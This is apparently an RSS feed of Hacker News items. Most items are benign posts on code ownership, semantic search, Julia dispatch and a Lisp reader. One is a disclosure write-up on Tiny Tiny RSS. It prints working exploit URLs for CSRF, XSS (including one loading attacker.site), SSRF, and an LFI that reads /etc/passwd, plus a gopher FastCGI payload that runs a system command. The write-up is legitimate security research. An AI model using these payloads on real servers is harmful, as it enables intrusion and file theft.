<li>Mastery of a domain‚Ää‚Äî‚ÄäIf you don‚Äôt have a domain over which you have authority, this is impossible.</li>
<li>Pride of good workmanship‚Ää‚Äî‚ÄäYou have something to look back at and be proud of that you were responsible for.</li>
<li>Respect from peers‚Ää‚Äî‚ÄäOther people have something to look at and appreciate that you were responsible for.</li>
<li>Joy of knowing that you provided something of worth to others‚Ää‚Äî‚Ääit is easier to see how your work directly effected the customer.</li>
<li>The increasing ease of sustainability and re-usability that only comes from constant attention to the state of a code base‚Ää‚Äî‚ÄäIf you can‚Äôt be the gatekeeper to the code, it is constantly changing in ways that are outside your control.</li>
<li>A personal portfolio‚Ää‚Äî‚Ääyou can build up concrete work examples that demonstrate your skills. From a management perspective, how else can anyone be accurately assessed for their contributions. (Given that software metrics have all proven to be marginally useful.)</li>
</ul>
<p>All of these benefits are incompletely realized if not altogether lacking under a collectivist code ownership scheme.</p>
<p>Jeff Atwood makes a similar observation in his blog post, <em>You Gotta Own It</em>:</p>
<blockquote><p>‚Ä¶ if you do want great software, you have to let the developers own what they‚Äôre building. The developers are inevitably the ones who have the most control over the success or failure of the project. Creating an environment where your developers have no emotional attachment to the project they‚Äôre working on is a recipe for mediocre software‚Ää‚Äî‚Ääand job disillusionment.‚Å∂</p></blockquote>
<p>It is my belief that increasing employee engagement is the real secret to massive increases in productivity, more so than the latest process fad or flurry of team building activities. Strong code ownership is a pivotal part of securing that engagement.</p>
<h3>Sources</h3>
<p>3,4,5. <a href="https://www.npr.org/sections/money/2012/01/20/145360447/the-secret-document-that-transformed-china" target="_blank" rel="noopener">https://www.npr.org/sections/money/2012/01/20/145360447/the-secret-document-that-transformed-china</a></p>
<p>1,2. <a href="https://martinfowler.com/bliki/CodeOwnership.html" target="_blank" rel="noopener">https://martinfowler.com/bliki/CodeOwnership.html</a></p>
<p>6. <a href="https://blog.codinghorror.com/you-gotta-own-it/" target="_blank" rel="noopener">https://blog.codinghorror.com/you-gotta-own-it/</a></p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://flatwire.org/2018/10/18/strong-code-ownership/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580700</guid>
            <pubDate>Thu, 24 Sep 2020 16:54:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploiting Tiny Tiny RSS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580672">thread link</a>) | @fanf2
<br/>
September 24, 2020 | https://www.digeex.de/blog/tinytinyrss/ | <a href="https://web.archive.org/web/*/https://www.digeex.de/blog/tinytinyrss/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><em>Andrew Dolgov (main tt-rss developer) has resolved all the issues fast and it was a pleasure to do the disclosure with him. For a period of three days since our first contact with him, many security related changes were pushed, and with <a href="https://git.tt-rss.org/fox/tt-rss/commit/3588d5186ef7321fa573adbb62f42b05d7a138be">last commit</a> the gettext CVE finding was fixed. You can follow the discussion about our findings and fixes in the <a href="https://community.tt-rss.org/t/heads-up-several-vulnerabilities-fixed/3799">TinyTinyRSS Community forum</a>.</em></p><p>You can read the whole <a href="https://www.digeex.de/uploads/TinyTinyRSS.pdf">PDF report here</a>. Inside the report you will see mentions of the proof of concept (PoC) scripts. We have deliberately not published them to prevent script kiddie attacks.</p><p>After cloning <a href="https://git.tt-rss.org/fox/tt-rss/">the repository</a> first file we analyzed was in <code>classes/handler/public.php</code> as that was part that was accessible while unauthenticated. What we immediately noticed is that some functionalities there are not protected by CSRF token. At this time, logout and subscribe functions seemed like the only ones worth exploiting in this manner.</p><p>For forcefully subscribing user to your feed one can send GET requests to this URL: <code>/public.php?op=subscribe&amp;feed_url=http://your-site.com</code></p><p>For annoying user by logging them out, one can use this URL: <code>/public.php?op=logout</code></p><p>Incorporating these URLs into image tag in feed could be used for denial of service of sorts by subscribing users to a lot of unwanted feeds or logging him out whenever he views feed. However, this seemed more like an annoyance than a genuinely critical issue.</p><p>Thinking there is nothing left to see in the <code>public.php</code> file, we decided to explore webapp a bit without looking at the source code. Specifically, we were hunting for XSS vulnerabilities. We noticed that when login failed, the username would be visible in system logs (preferences-&gt;event log with an admin account), so we wanted to check if this could lead to XSS. Logging in with username <code>test&lt;aaa</code> yielded an interesting result.</p><figure><img src="https://www.digeex.de/content/images/2020/09/TinyTinyRSSPreferences-2.png" alt="" srcset="https://www.digeex.de/content/images/size/w600/2020/09/TinyTinyRSSPreferences-2.png 600w, https://www.digeex.de/content/images/2020/09/TinyTinyRSSPreferences-2.png 867w" sizes="(min-width: 720px) 720px"></figure><p>As we can see, only the part before <code>&lt;</code> got processed, and the rest was truncated.</p><p>We decided to check if it processes passwords the same way by adding <code>&lt;randomgarbage</code> to a valid password. To our surprise, we successfully logged in! This looks like a harmless gimmick initially as it gains no advantage to an attacker, but there is a curious edge-case.</p><p>Assume the user sets his/her password to <code>a&lt;verysecurepassword</code>, tt-rss gives no warning that <code>&lt;</code> should not be used in a password. Next time the user logs in with <code>a&lt;verysecurepassword</code>, it will be successful, but the only part before <code>&lt;</code> is being processed! Therefore it is also possible to log in just by using password <code>a</code>!</p><p>We decided to go back to source code analysis again. We rechecked <code>public.php</code> to see if we missed something. Indeed there was an interesting function: <code>pluginhandler</code>. tt-rss comes with several plugins installed by default (more can be added, but we were only interested in exploiting default tt-rss), and each has an <code>init.php</code> file with plugin class defined. With <code>pluginhandler</code> function, one can call public methods of plugin class (plugin name goes in <code>plugin</code> parameter and method name in <code>pmethod</code>). So we decided to check if there are any exploitable public methods.</p><p>After changing directory to <code>tt-rss/plugins</code> we grepped for <code>public function</code>. Method <code>imgproxy</code> in <code>af_proxy_http</code> plugin looked interesting.</p><p><strong>It should be noted that none of the vulnerabilities found require plugin to be enabled, it just needs to be installed (and it is, by default).</strong></p><p>At first there was slight disappointment, cause right at the beginning of the method, there was the following code:</p><pre><code>$url = rewrite_relative_url(get_self_url_prefix(), $_REQUEST["url"]);
// called without user context, let's just redirect to original URL

if (!$_SESSION["uid"]) {
        header("Location: $url");
        return;
}
</code></pre><p>We can supply the <code>url</code> parameter, but a redirect will be made to that URL (open redirect is not a significant attack vector for this web app) when unauthenticated. However, we decided to analyze the plugin further to see if feasible attack vectors could use minimal user interaction.</p><h2 id="first-xss-vulnerability">First XSS vulnerability</h2><p>Code continues like this:</p><pre><code>$local_filename = sha1($url);
...
$data = fetch_file_contents(["url" =&gt; $url, "max_size" =&gt; MAX_CACHE_FILE_SIZE]);
...
if (!$disable_cache) {
    if ($this-&gt;cache-&gt;put($local_filename, $data)) {
          header("Location: " . $this-&gt;cache-&gt;getUrl($local_filename));
          return;
          }
}
</code></pre><p>If user is authenticated and makes the request with <code>url</code> parameter, the plugin will compute sha1 hash of the URL, which will be the filename. The plugin will fetch the content hosted at the URL (using <code>libcurl</code> if it is installed) and store it at <code>{ttrss directory}/cache/images/{sha1 sum of the url}</code>, the file can also be accessed using <code>cached_view</code> functionality in <code>public.php</code>: <code>/public.php?op=cached_url&amp;file=images/{sha1 sum of the url}</code></p><p>What raised our suspicious is that we could not find any code enforcing that this file needs to be delivered as an image, so we tried to upload the HTML page and execute javascript.</p><p>Turns out it was successful! If the URL of the payload is supplied in the <code>url</code> parameter, the plugin will fetch the payload, store it in the cache directory, and then redirect users to view stored files.<br>Thus if the user clicks a link like this, javascript code can be executed:<br><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=http://attacker.site/xss.html</code></p><figure><img src="https://www.digeex.de/content/images/2020/09/60eb4a4da519ab8aa9656ac8defb9f68.png" alt="60eb4a4da519ab8aa9656ac8defb9f68"></figure><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25789">CVE-2020-25789</a> was assigned to keep track of this vulnerability.</p><h2 id="ssrf">SSRF</h2><p>In addition to not enforcing MIME type, we also noticed a lack of internal address filtering. In other words, making requests to internal services was possible as an authenticated user.</p><p>An authenticated user could request this:<br><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=http://127.0.0.1:1234/sensitiveInternalPage.html</code></p><p>Alternatively, an unauthenticated attacker could leverage XSS described in the previous section to scan internal services.</p><h2 id="lfi">LFI</h2><p>We looked again at how <code>af_proxy_http</code> fetches content. In <code>plugins/af_proxy_http/init.php</code> the following line can be seen:<br><code>$data = fetch_file_contents(["url" =&gt; $url, "max_size" =&gt; MAX_CACHE_FILE_SIZE]);</code></p><p>Function <code>fetch_file_contents</code> is not a native PHP function but rather a custom function written by tt-rss developers. If <code>libcurl</code> is installed, it uses it to fetch content from the requested URL (if <code>libcurl</code> is not installed, it uses <code>file_get_contents</code>). Plenty of protocols are supported by <code>libcurl</code>, including <code>file://</code>, again we noticed no filtering or enforcing that URL needs to be HTTP URL. JThus we figured reading local files must be possible.</p><p>First attempt failed:<br><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=file:///etc/passwd</code></p><figure><img src="https://www.digeex.de/content/images/2020/09/ec2a357b91a9c73101abe05c18c63154.png" alt="ec2a357b91a9c73101abe05c18c63154"></figure><p>It failed because the file will be stored in cache only if <code>libcurl</code> gets HTTP response code 200; alternatively, it shows an error image.</p><p>However, file contents can still be seen. For some reason, the plugin also has an alternative way of showing errors that can be used to get file contents. All that needs to be done to trigger it is add the <code>text</code> parameter.</p><p><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=file:///etc/passwd&amp;text=1</code></p><figure><img src="https://www.digeex.de/content/images/2020/09/Screenshot_2020-09-10-Screenshot.png" alt="Screenshot_2020-09-10-Screenshot"></figure><p>As with SSRF, an attacker can pair this vulnerability with reflected XSS and extract sensitive files' contents.</p><p>This vulnerability has been asigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25787">CVE-2020-25787</a> by the MITRE corporation.</p><h3 id="another-xss">Another XSS</h3><p>For completion's sake, let's mention that <code>url</code> parameter is also vulnerable to reflected XSS when used in conjunction with the text parameter.</p><p><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=&lt;script&gt;alert(1)&lt;/script&gt;&amp;text=1</code></p><figure><img src="https://www.digeex.de/content/images/2020/09/8ba4ac8dd07d0a6021a8836143b11922.png" alt="8ba4ac8dd07d0a6021a8836143b11922"></figure><p>To keep track of this vulnerability, <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25788">CVE-2020-25788</a> was assigned.</p><h2 id="escalating-to-remote-code-execution">Escalating to remote code execution</h2><p>Our goal from the start was to discover a RCE vulnerability. Classic LFI to RCE escalation was not applicable, as with that vulnerability, we could only read PHP code, not execute it.</p><p>After we analyzed other parts of an application and failing to find RCE (other than one in <a href="https://www.exploit-db.com/exploits/40154">outdated PHP gettext</a> library which would require the attacker to modify translation files), we returned to <code>af_proxy_http</code> plugin.</p><p>We planned to see if it is realistic to escalate SSRF to RCE through something commonly installed along the tt-rss.</p><p>We came across <a href="https://github.com/tarunkant/Gopherus">gopherus</a> tool which describes itself as tool that generates gopher link for exploiting SSRF and gaining RCE in various servers. <code>libcurl</code> supports plenty of protocols; Gopher is particularly useful for an attacker cause it can be used to craft custom TCP packets.</p><p>By examining <a href="https://git.tt-rss.org/fox/ttrss-docker-compose">docker files</a> (docker is the recommended way of installing tt-rss at the time of writing), we concluded PHP-FPM running on port 9000 is the best attack vector. We ran gopherus to generate payload (gopher URL), it is relatively easy to run it. All attacker needs to know is the location of any PHP file on a remote system (on non-dockerized installation we were testing on we chose <code>/srv/http/tt-rss/config.php</code>). First attempt failed. After some troubleshooting we realized payload needs to be double url encoded (without double encoding, raw null bytes were passed to <code>curl_exec</code>). Following that, we ran it...and it failed again, this time without clear reason.</p><figure><img src="https://www.digeex.de/content/images/2020/09/45d612473af47eb737a145da667d8619.png" alt="" srcset="https://www.digeex.de/content/images/size/w600/2020/09/45d612473af47eb737a145da667d8619.png 600w, https://www.digeex.de/content/images/size/w1000/2020/09/45d612473af47eb737a145da667d8619.png 1000w, https://www.digeex.de/content/images/2020/09/45d612473af47eb737a145da667d8619.png 1335w" sizes="(min-width: 720px) 720px"><figcaption>./gopherus.py --exploit fastcgi (modified so it double-encodes)</figcaption></figure><p>We ssh'd to the box tt-rss was running on and tried to make the request manually (this time URL is not double-encoded cause it's not processed twice).</p><pre><code>curl gopher://localhost:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%08%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclien%20%0%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1BSCRIPT_FILENAME/srv/http/tt-rss/public.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27ls%20%3E%20/srv/http/tt-rss/cache/images/a.txt%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
</code></pre><p>Result was <code>curl: (3) URL using bad/illegal format or missing URL</code>.</p><p><a href="https://github.com/curl/curl/commit/31e53584db5879894809fbde5445aac7553ac3e2#diff-5af1b0638bb439638b199b389467edbd">This commit</a> reveals the problem. tt-rss was self-hosted on an ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.digeex.de/blog/tinytinyrss/">https://www.digeex.de/blog/tinytinyrss/</a></em></p>]]>
            </description>
            <link>https://www.digeex.de/blog/tinytinyrss/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580672</guid>
            <pubDate>Thu, 24 Sep 2020 16:51:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Semantic Search?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580514">thread link</a>) | @danial
<br/>
September 24, 2020 | https://www.traindex.io/blog/what-is-semantic-search-3612 | <a href="https://web.archive.org/web/*/https://www.traindex.io/blog/what-is-semantic-search-3612">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>How many times have you had a song's lyrics stuck in your head? Or wanted to search about something but don't know how to describe it? We all have gone through these scenarios in our lives. Who was always there to save the day? Yes, the internet! The power of modern search engines to search through vast amounts of information is unquestionable. They search through billions of webpages on the internet to give you what you need. Like searching for a needle in a haystack except sometimes, users cannot describe the needle.</p>

<p>Retrieving relevant information from an extensive collection of documents is a challenge. Techniques like syntax analysis, string matching, KPS (Keyword, Pattern, Sample) Search, Semantic Search, etc. have their own merits. Yet, semantic search is superior.</p>

<h2>
  <a name="why-semantic-search" href="https://dev.to/#why-semantic-search" target="__blank">
  </a>
  Why Semantic Search?
</h2>

<p>Semantic search is a searching technique that improves the accuracy or relevance of the results. It does this by understanding the user's intent through contextual meaning. It answers questions that are not present in the search space. It can also provide personalized search results based on different factors. Semantic search finds that forgotten song's lyrics and also searches important documents from your vast collection of corporate data.</p>

<h3>
  <a name="relevant-results" href="https://dev.to/#relevant-results" target="__blank">
  </a>
  Relevant Results
</h3>

<p>Modern, powerful Machine Learning and Natural Language Processing algorithms enable the search engine to "understand" what the user has asked. The search engine analyzes entities in sentences, inter-dependence of words, synonyms, context. Sometimes it analyzes other factors, such as the browser history of web search engines. This allows users to get accurate results. </p>

<h3>
  <a name="better-user-experience" href="https://dev.to/#better-user-experience" target="__blank">
  </a>
  Better User Experience
</h3>

<p>Getting accurate information at a fast pace results in better user experience. Semantic search is quick and accurate resulting in better user experience.</p>

<h3>
  <a name="discover-knowledge" href="https://dev.to/#discover-knowledge" target="__blank">
  </a>
  Discover Knowledge
</h3>

<p>Unlike keyword search, semantic search aims to understand the user's query and intent. It is likely to get results with the same concepts and ideas. It can help discover new things about the same topics, which can be very useful. Also, in a corporate setting, semantic search can help enhance business intelligence. For example, a keyword search from the resume database will take keywords like "python" AND "machine learning," etc., and find resumes that only have those keywords. But, semantic search can take input like "machine learning python" and provide the resumes with these terms and the resumes with similar ideas but don't have the same words.</p>

<h2>
  <a name="traindex-and-semantic-search" href="https://dev.to/#traindex-and-semantic-search" target="__blank">
  </a>
  Traindex and Semantic Search
</h2>

<p>We understand the importance of semantic search, especially in corporate settings. Traindex implements semantic search solutions for your data collection doesn't matter what it is. To understand how we do it, consider the example of a library. A library can have thousands of books, yet a librarian can tell you exactly where a particular book is. How is the librarian able to do so? By using topical indexes. Libraries divide books into topics. Each subject has its space, and the location of these doesn't change. The librarian can point you towards a specific book, it's the exact location. Traindex implements a semantic search and uses various machine learning and NLP algorithms to learn the topics and maintain an index for fast lookups. It can search for a wide variety of data from corporate resume data to patent data and other critical corporate data. We provide secure end-to-end pipelines to implement our solution, so our interaction with your data is minimal.  </p>

<h2>
  <a name="how-to-implement-semantic-search" href="https://dev.to/#how-to-implement-semantic-search" target="__blank">
  </a>
  How to Implement Semantic Search?
</h2>

<p>There are a ton of different techniques and algorithms available to develop a semantic search system. Choosing one of them depends on many factors like the dataset, resources available, urgency, etc. Traindex can implement any of these algorithms according to the requirements. Here are some most common algorithms.</p>

<h3>
  <a name="latent-semantic-indexinglatent-dirichlet-allocation" href="https://dev.to/#latent-semantic-indexinglatent-dirichlet-allocation" target="__blank">
  </a>
  Latent Semantic Indexing/Latent Dirichlet Allocation
</h3>

<p>Both LSI and LDA take a bag of words formatted as a matrix as input. LSI uses SVD, a very popular matrix decomposition technique to find latent dimensions, aka topics from the input. In contrast, LDA is a generative probabilistic model, and it assumes a Dirichlet Prior over the Latent topics. Methods like TF-IDF can be used to make an input matrix, and then LSI and LDA can do their work and figure out the N number of topics from the input. The number of topics is hyper-parameter and can be tuned based on factors such as data size, resource availability, etc. For an incoming query, the model will find the topic that matches the input most, and from that topic, it will find the most relevant results and rank them. </p>

<p><a href="https://res.cloudinary.com/practicaldev/image/fetch/s--scCDYwdC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/n9kjwg3vydplq0f866um.png" target="__blank"><img src="https://res.cloudinary.com/practicaldev/image/fetch/s--scCDYwdC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/n9kjwg3vydplq0f866um.png" alt="LSA" loading="lazy"></a></p>

<h3>
  <a name="word2vecdoc2vec" href="https://dev.to/#word2vecdoc2vec" target="__blank">
  </a>
  Word2Vec/Doc2Vec
</h3>

<p>Word2Vec and Doc2Vec models are embedding techniques that have provided state-of-the-art results in various natural language processing tasks and have acted as a silver bullet for a lot of different NLP problems. The bag of words technique results in a sparse matrix in very high dimensions. In contrast, the idea behind these embedding techniques is to represent the text in a fixed-sized, low-dimensional dense vector, which stores its semantic relationships. They also can learn these representations once and reuse them later. It has proven that embedding works way better than previous techniques. Choosing whether to use word2vec or doc2vec, again, depends on what sort of data you have. You can also use pre-trained embeddings for your semantic search engines.</p>

<p><a href="https://res.cloudinary.com/practicaldev/image/fetch/s--XlVJoBW2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/865jrrcno76ico5ec0zj.png" target="__blank"><img src="https://res.cloudinary.com/practicaldev/image/fetch/s--XlVJoBW2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/865jrrcno76ico5ec0zj.png" alt="w2v_d2v" loading="lazy"></a></p>

<h3>
  <a name="transformer-language-models" href="https://dev.to/#transformer-language-models" target="__blank">
  </a>
  Transformer Language Models
</h3>

<p>Transformers are deep learning models that encounter the problems of long-range dependencies and long training times in traditional models like RNNs, LSTMs, etc. They are parallelable and can address a wide range of NLP tasks through fine-tuning. They have been giving back to back SOTA results recently. Some common transformer models used these days are BERT, GPT-2, GPT-3, XLNet, Reformer, RoBERTa, etc. Although most of these models are generative, you can use them for your semantic search systems by fine-tuning them or using them to generate embeddings for your text. </p>

<h2>
  <a name="take-away" href="https://dev.to/#take-away" target="__blank">
  </a>
  Take Away
</h2>

<p>Searching for useful and relevant information from an extensive collection of text-based documents is arduous. Semantic search allows us to do so smartly. Search engines already do so, and Traindex can provide you with your very own custom semantic search system based on your data. Sounds amazing? Click <a href="https://www.traindex.io/" target="__blank">here</a> to request a demo. </p>

</div></div></div>]]>
            </description>
            <link>https://www.traindex.io/blog/what-is-semantic-search-3612</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580514</guid>
            <pubDate>Thu, 24 Sep 2020 16:40:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The missing harm of manual dispatch in Julia]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 37 (<a href="https://news.ycombinator.com/item?id=24580479">thread link</a>) | @amkkma
<br/>
September 24, 2020 | https://andreaskroepelin.de/blog/manual_dispatch/ | <a href="https://web.archive.org/web/*/https://andreaskroepelin.de/blog/manual_dispatch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Just a short one today:
New users of Julia coming from other dynamically typed languages might write functions like</p>
<div><pre><code data-lang="julia"><span>function</span> <span>foo</span><span>(</span><span>x</span><span>)</span>
    <span>if</span> <span>x</span> <span>isa</span> <span>Int</span>
        <span>x</span> <span>+</span> <span>x</span>
    <span>elseif</span> <span>x</span> <span>isa</span> <span>Float64</span>
        <span>x</span> <span>/</span> <span>2.0</span>
    <span>elseif</span> <span>x</span> <span>isa</span> <span>String</span>
        <span>length</span><span>(</span><span>x</span><span>)</span>
    <span>else</span>
        <span>1</span>
    <span>end</span>
<span>end</span>
</code></pre></div><p>This is clearly unidiomatic and should be written as</p>
<div><pre><code data-lang="julia"><span>bar</span><span>(</span><span>x</span><span>::</span><span>Int</span><span>)</span> <span>=</span> <span>x</span> <span>+</span> <span>x</span>
<span>bar</span><span>(</span><span>x</span><span>::</span><span>Float64</span><span>)</span> <span>=</span> <span>x</span> <span>/</span> <span>2.0</span>
<span>bar</span><span>(</span><span>x</span><span>::</span><span>String</span><span>)</span> <span>=</span> <span>length</span><span>(</span><span>x</span><span>)</span>
<span>bar</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>1</span> <span># or bar(x::Any), to be explicit</span>
</code></pre></div><p>because it is nicer to read and very easy to extend for other types of <code>x</code>.
Well, you technically can extend <code>foo</code> the same way as <code>bar</code>, but reading the definition of <code>foo</code> one would expect to then know its complete behavior, so it would be misleading.</p>
<p><em>However</em>, my point is that there is actually (maybe surprisingly) no harm at runtime for code as in <code>foo</code>!
The Julia compiler isn‚Äôt tricked that easily and will still produce optimal machine code for each type of the argument:</p>
<div><pre><code data-lang="julia"><span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>(</span><span>1</span><span>)</span>
    <span>.</span><span>text</span>
    <span>leaq</span>	<span>(</span><span>%</span><span>rdi</span><span>,</span><span>%</span><span>rdi</span><span>),</span> <span>%</span><span>rax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>(</span><span>1</span><span>)</span>
    <span>.</span><span>text</span>
    <span>leaq</span>	<span>(</span><span>%</span><span>rdi</span><span>,</span><span>%</span><span>rdi</span><span>),</span> <span>%</span><span>rax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>
</code></pre></div><p>Both functions basically compile down to a single adding instruction (<code>leaq</code>; <code>retq</code> is for returning from the function and <code>nopw</code> is an operation that does nothing and is there for <a href="https://en.wikipedia.org/wiki/NOP_%28code%29%23Machine_language_instructions">technical reasons</a>).
Think about it this way:
When Julia compiles <code>foo(1)</code>, it knows that <code>1</code> is of type <code>Int</code>, can evaluate the <code>x isa Int</code> expression at compile time to <code>true</code>, and discard everything but the <code>x + x</code> without a problem.</p>
<h2 id="appendix">‚ÄúAppendix‚Äù</h2>
<p>For completeness, here is what‚Äôs produced in the other cases:</p>
<div><pre><code data-lang="julia"><span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>(</span><span>1.0</span><span>)</span>
    <span>.</span><span>text</span>
    <span>movabsq</span>	<span>$</span><span>140581530607976</span><span>,</span> <span>%</span><span>rax</span>  <span># imm = 0x7FDBB031A168</span>
    <span>vmulsd</span>	<span>(</span><span>%</span><span>rax</span><span>),</span> <span>%</span><span>xmm0</span><span>,</span> <span>%</span><span>xmm0</span>
    <span>retq</span>
    <span>nop</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>(</span><span>1.0</span><span>)</span>
    <span>.</span><span>text</span>
    <span>movabsq</span>	<span>$</span><span>140581530608088</span><span>,</span> <span>%</span><span>rax</span>  <span># imm = 0x7FDBB031A1D8</span>
    <span>vmulsd</span>	<span>(</span><span>%</span><span>rax</span><span>),</span> <span>%</span><span>xmm0</span><span>,</span> <span>%</span><span>xmm0</span>
    <span>retq</span>
    <span>nop</span>


<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>(</span><span>"abc"</span><span>)</span>
    <span>.</span><span>text</span>
    <span>pushq</span>	<span>%</span><span>rax</span>
    <span>movabsq</span>	<span>$</span><span>"ncodeunits;"</span><span>,</span> <span>%</span><span>rax</span>
    <span>callq</span>	<span>*%</span><span>rax</span>
    <span>popq</span>	<span>%</span><span>rcx</span>
    <span>retq</span>
    <span>nop</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>(</span><span>"abc"</span><span>)</span>
    <span>.</span><span>text</span>
    <span>pushq</span>	<span>%</span><span>rax</span>
    <span>movabsq</span>	<span>$</span><span>"ncodeunits;"</span><span>,</span> <span>%</span><span>rax</span>
    <span>callq</span>	<span>*%</span><span>rax</span>
    <span>popq</span>	<span>%</span><span>rcx</span>
    <span>retq</span>
    <span>nop</span>


<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>([])</span>
    <span>.</span><span>text</span>
    <span>movl</span>	<span>$</span><span>1</span><span>,</span> <span>%</span><span>eax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>([])</span>
    <span>.</span><span>text</span>
    <span>movl</span>	<span>$</span><span>1</span><span>,</span> <span>%</span><span>eax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>
</code></pre></div>
        </div></div>]]>
            </description>
            <link>https://andreaskroepelin.de/blog/manual_dispatch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580479</guid>
            <pubDate>Thu, 24 Sep 2020 16:36:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compiling a Lisp: Reader]]>
            </title>
            <description>
<![CDATA[
Score 113 | Comments 27 (<a href="https://news.ycombinator.com/item?id=24580453">thread link</a>) | @azhenley
<br/>
September 24, 2020 | https://bernsteinbear.com/blog/compiling-a-lisp-6/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/compiling-a-lisp-6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p><em><a href="https://bernsteinbear.com/blog/compiling-a-lisp-0/">first</a></em> ‚Äì <em><a href="https://bernsteinbear.com/blog/compiling-a-lisp-5/">previous</a></em></p>

<p>Welcome back to the ‚ÄúCompiling a Lisp‚Äù series. This time I want to take a break
from compiling and finally add a <em>reader</em>. I‚Äôm finally getting frustrated
manually entering increasinly complicated ASTs, so I figure it is time. After
this post, we‚Äôll be able to type in programs like:</p>



<p>and have our compiler make ASTs for us! Magic. This will also add some nice
debugging tools for us. For example, imagine an interactive command line
utility in which we can enter Lisp expressions and the compiler prints out
human-readable assembly (and hex? maybe?). It could even run the code, too.
Check out this imaginary demo:</p>

<div><div><pre><code>lisp&gt; 1
; mov rax, 0x4
=&gt; 1
lisp&gt; (add1 1)
; mov rax, 0x4
; add rax, 0x4
=&gt; 2
lisp&gt;
</code></pre></div></div>

<p>Wow, what a thought.</p>

<h3 id="the-reader-interface">The Reader interface</h3>

<p>To make this interface as simple and testable as possible, I want the reader
interface to take in a C string and return an <code>ASTNode *</code>:</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>Reader_read</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>);</span>
</code></pre></div></div>

<p>We can add interfaces later to support reading from a <code>FILE*</code> or file
descriptor or something, but for now we‚Äôll just use strings and line-based
input.</p>

<p>On success, we‚Äôll return a fully-formed <code>ASTNode*</code>. But on error, well, hold
on. We can‚Äôt just return <code>NULL</code>. On many platforms, <code>NULL</code> is defined to be
